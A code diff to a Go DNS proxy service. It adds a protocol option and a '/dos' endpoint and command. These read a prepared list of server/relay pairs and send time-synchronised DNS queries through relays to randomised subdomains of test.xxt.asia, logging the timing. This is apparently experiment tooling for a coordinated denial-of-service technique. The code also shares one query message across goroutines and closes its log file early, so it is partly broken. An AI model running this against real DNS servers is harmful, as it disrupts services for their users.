@@ -4,19 +4,22 @@ import (
 	"bufio"
 	crypto_rand "crypto/rand"
 	"encoding/binary"
+	"encoding/csv"
 	"flag"
 	"fmt"
+	"github.com/gin-gonic/gin"
+	"github.com/jedisct1/dlog"
+	"github.com/kardianos/service"
 	"github.com/miekg/dns"
+	"log"
 	"math/rand"
 	"net/http"
 	"os"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
-
-	"github.com/gin-gonic/gin"
-	"github.com/jedisct1/dlog"
-	"github.com/kardianos/service"
+	"time"
 )
 
 const (
@@ -139,7 +142,9 @@ func main() {
 		})
 
 		r.POST("/resolve", func(c *gin.Context) {
-			var req ResolveRequestBody
+			req := ResolveRequestBody{
+				ServerProtocol: "udp",
+			}
 			if err := c.ShouldBindJSON(&req); err != nil {
 				c.JSON(http.StatusBadRequest, gin.H{
 					"error": err.Error(),
@@ -151,13 +156,20 @@ func main() {
 			q.SetQuestion(dns.Fqdn(req.Name), dns.TypeA)
 
 			resp, rtt, err := app.proxy.ResolveQuery(
-				"udp", "udp", req.Server,
+				"udp", req.ServerProtocol, req.Server,
 				req.RelayName, q)
 			c.JSON(http.StatusOK, gin.H{
 				"rtt":    rtt,
 				"server": req,
 				"error":  err,
 				"data":   resp,
+			})
+		})
+
+		r.POST("/dos", func(c *gin.Context) {
+			app.dos()
+			c.JSON(http.StatusOK, gin.H{
+				"msg": "ok",
 			})
 		})
 
@@ -218,10 +230,13 @@ func main() {
 				q := new(dns.Msg)
 				q.SetQuestion(dns.Fqdn(name), dns.TypeA)
 
-				res, _, _ := app.proxy.ResolveQuery(
-					"udp", "udp", server,
+				res, rtt, _ := app.proxy.ResolveQuery(
+					"udp", "tcp", server,
 					relayName, q)
 				fmt.Println(res)
+				fmt.Printf("rtt: %dms\n", rtt)
+			case "dos":
+				app.dos()
 			}
 		}
 	}()
@@ -274,7 +289,80 @@ func (app *App) Stop(service service.Service) error {
 }
 
 type ResolveRequestBody struct {
-	Name      string `json:"name"`
-	Server    string `json:"server"`
-	RelayName string `json:"relayName"`
+	Name           string `json:"name"`
+	Server         string `json:"server"`
+	RelayName      string `json:"relayName"`
+	ServerProtocol string `json:"serverProtocol"`
+}
+
+func readCsvFile(filePath string) [][]string {
+	f, err := os.Open(filePath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer f.Close()
+
+	csvReader := csv.NewReader(f)
+	records, err := csvReader.ReadAll()
+	if err != nil {
+		log.Fatal("Unable to parse file as CSV for "+filePath, err)
+	}
+
+	return records
+}
+
+var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+
+func RandStringRunes(n int) string {
+	b := make([]rune, n)
+	for i := range b {
+		b[i] = letterRunes[rand.Intn(len(letterRunes))]
+	}
+	return string(b)
+}
+
+func (app *App) dos() {
+	// load prepared list
+	// make a query for server-relay-randomStr-index.test.xxt.asia
+	q := new(dns.Msg)
+	fout, err := os.OpenFile("send_result.csv", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Fatal("Unable to read input file ", err)
+	}
+	path, err := os.Getwd()
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println(path) // for example /home/user
+	records := readCsvFile("../prepared_list.csv")
+	for i, record := range records[1:] {
+		recordCopy := make([]string, len(record))
+		copy(recordCopy, record)
+
+		go func(record []string, index int) {
+			server := record[0]
+			relay := record[1]
+			sendTime, _ := strconv.ParseFloat(record[2], 64)
+			timeNow := float64(time.Now().UnixNano()) / 1e6
+			if sendTime > timeNow {
+				time.Sleep(time.Duration(sendTime-timeNow) * time.Millisecond)
+			}
+			arrivalTime, _ := strconv.ParseFloat(record[3], 64)
+			domain := fmt.Sprintf("%s-%s-%s-%d.test.xxt.asia", server, relay, RandStringRunes(8), index)
+			q.SetQuestion(dns.Fqdn(domain), dns.TypeA)
+			realSendTime := float64(time.Now().UnixNano()) / 1e6
+			resp, rtt, err := app.proxy.ResolveQuery(
+				"udp", "tcp", server,
+				relay, q)
+			if err != nil {
+				dlog.Warn(err)
+				return
+			}
+			sendTimeDiff := realSendTime - sendTime
+			fout.WriteString(fmt.Sprintf("%s,%s,%f,%f,%f,%f,%d\n",
+				server, relay, sendTime, realSendTime, sendTimeDiff, arrivalTime, rtt))
+			fmt.Println(server, relay, rtt, resp.Answer)
+		}(recordCopy, i)
+	}
+	fout.Close()
 }
